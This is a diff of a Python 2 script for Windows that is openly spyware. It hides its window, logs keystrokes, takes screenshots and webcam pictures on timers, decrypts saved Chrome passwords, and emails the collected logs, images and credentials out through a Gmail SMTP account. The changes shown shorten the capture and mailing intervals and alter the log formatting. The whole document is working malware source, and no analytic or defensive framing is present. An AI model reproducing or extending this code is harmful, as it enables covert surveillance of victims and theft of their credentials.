@@ -1,4 +1,3 @@
-import os
 import time
 import pyHook
 import smtplib
@@ -7,7 +6,6 @@ import win32gui
 import mimetypes
 import pythoncom
 import win32crypt
-import subprocess
 import win32console
 import win32clipboard
 from os import getenv
@@ -36,10 +34,9 @@ f_name = "output.txt"
 
 # Screenshot
 # interval in sec
-interval = 120
+interval = 60
 
 # WebCam
-cam = Device()
 # interval in sec
 interval_webcam = 120
 
@@ -51,7 +48,7 @@ FromConf = 'your_username@gmail.com'
 ToConf = 'your_username@gmail.com'
 passwordConf = 'your_password'
 
-intervalMail = 600
+intervalMail = 360
 
 
 def hide():
@@ -63,31 +60,25 @@ hide()
 def keydown(event):
     global data
     if event.Ascii == 13:
-            keys = '  <ENTER>'
+            keys = '<ENTER>'
             fp = open(f_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 8:
-            keys = '  <BACKSPACE>'
+            keys = '<BACKSPACE>'
             fp = open(f_name, 'a')
             data = keys
-            fp.write(data + '\n')
+            fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 9:
-            keys = '  <TAB>'
+            keys = '<TAB>'
             fp = open(f_name, 'a')
             data = keys
             fp.write(data + "\n")
             fp.close()
     elif event.Ascii == 27:
-            keys = '  <ESC>'
-            fp = open(f_name, 'a')
-            data = keys
-            fp.write(data + "\n")
-            fp.close()
-    elif event.Ascii == 32:
-            keys = '  <SPACE>  '
+            keys = '<ESC>'
             fp = open(f_name, 'a')
             data = keys
             fp.write(data + "\n")
@@ -117,21 +108,19 @@ def keylogger():
 
 
 def webcam_pic(interval_w):
-
+    cam = Device()
     while True:
         time.sleep(interval_w)
-        cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
-        scr = "webcam_" + cur_time + ".jpg"
-        files.append(str(scr))
-        cam.saveSnapshot(scr)
+        pic = cam.saveSnapshot('image.png')
+        files.append(pic)
 
 
 def screenshot(interval_scr):
     while True:
         time.sleep(interval_scr)
         cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
-        scr = "screenshot_" + cur_time + ".png"
-        files.append(str(scr))
+        scr = "screenshot" + cur_time + ".png"
+        files.append(scr)
         ImageGrab.grab().save(scr, "PNG")
 
 
@@ -154,54 +143,48 @@ def send_mail(From, To, password, intervalM):
             smtp.login(From, password)
         except:
             login = 'failed'
-            print login
         else:
             login = 'success'
-            print login
 
         if login == 'success':
-            for f in files:
-                ctype, encoding = mimetypes.guess_type(f)
+            for file in files:
+                ctype, encoding = mimetypes.guess_type(file)
                 if ctype is None or encoding is not None:
                     # No guess could be made, or the file is encoded (compressed), so
                     # use a generic bag-of-bits type.
                     ctype = 'application/octet-stream'
                 maintype, subtype = ctype.split('/', 1)
                 if maintype == 'text':
-                    fp = open(f)
+                    fp = open(file)
                     # Note: we should handle calculating the charset
                     part = MIMEText(fp.read(), _subtype=subtype)
                     fp.close()
                 elif maintype == 'image':
-                    fp = open(f, 'rb')
+                    fp = open(file, 'rb')
                     part = MIMEImage(fp.read(), _subtype=subtype)
                     fp.close()
                 else:
-                    fp = open(f, 'rb')
+                    fp = open(file, 'rb')
                     part = MIMEBase(maintype, subtype)
                     part.set_payload(fp.read())
                     fp.close()
-                part.add_header('Content-Disposition', 'attachment; filename="%s"' % f)
+                part.add_header('Content-Disposition', 'attachment; filename="%s"' % file)
                 msg.attach(part)
             try:
                 smtp.sendmail(From, To, msg.as_string())
                 open(f_name, 'w').close()
-                with open(f_name, 'w') as fl:
-                    fl.write('### Keylogger - Log ###\n')
-                    fl.close()
+                with open(f_name, 'w') as f:
+                    f.write('### Keylogger - Log ###\n')
+                    f.close()
                 dump_chrome_passwords()
-                for fi in files[1:]:
-                    os.remove(fi)
                 del files[:]
                 files.append("output.txt")
-                print 'doppel success'
-                smtp.close()
+                print 'success'
             except:
                 print 'fail'
-                smtp.close()
         else:
+            print 'failed'
             smtp.close()
-            print 'fail'
 
 
 """
@@ -222,20 +205,14 @@ def dump_chrome_passwords():
 
     cursor.execute('SELECT action_url, username_value, password_value FROM logins')
     with open(f_name, 'a') as f:
-        f.write('\n\n\n### All Chrome Passwords ###\n\n')
+        f.write('\n### All Chrome Passwords ###\n')
         f.close()
     for result in cursor.fetchall():
         password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
         if password:
-            site = 'Site: ' + result[0]
-            username = 'Username: ' + result[1]
-            password = 'Password: ' + password
-            with open(f_name, 'a') as f:
-                f.write(site + '\n' + username + '\n' + password + '\n\n')
+            with open(f_name, 'w') as f:
+                f.write('### All Chrome Passwords ###' + 'Website: ' + result[0] + '\n' + 'Username: ' + result[1] + '\n' + 'Password: ' + password + '\n\n')
                 f.close()
-    with open(f_name, 'a') as f:
-        f.write('\n\n### END ###\n\n\n')
-        f.close()
 
 
 def create_workers():
